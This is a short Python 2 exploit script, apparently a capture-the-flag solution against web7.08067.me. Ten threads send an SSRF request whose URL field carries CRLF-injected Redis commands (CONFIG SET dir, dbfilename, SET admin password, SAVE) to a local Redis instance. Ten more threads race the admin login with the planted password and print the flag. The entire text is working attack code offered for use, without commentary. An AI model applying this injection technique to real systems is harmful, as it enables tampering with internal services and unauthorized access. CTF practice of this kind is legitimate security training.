import requests
import threading
def test():
    while True:
        try:
            url = "http://web7.08067.me/web7/input"
            data = {'value': 'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'}
            requests.post(url, data=data)
        except Exception, e:
            pass
def test2():
    while True:
        try:
            url = "http://web7.08067.me/web7/admin"
            data = {'passworld': 'xx00'}
            text = requests.post(url, data=data).text
            if 'flag' in text:
                print text
        except:
            pass
list = []
for i in range(10):
    t = threading.Thread(target=test)
    t.setDaemon(True)
    t.start()
    list.append(t)
for i in range(10):
    t = threading.Thread(target=test2)
    t.setDaemon(True)
    t.start()
    list.append(t)
for i in list:
    i.join()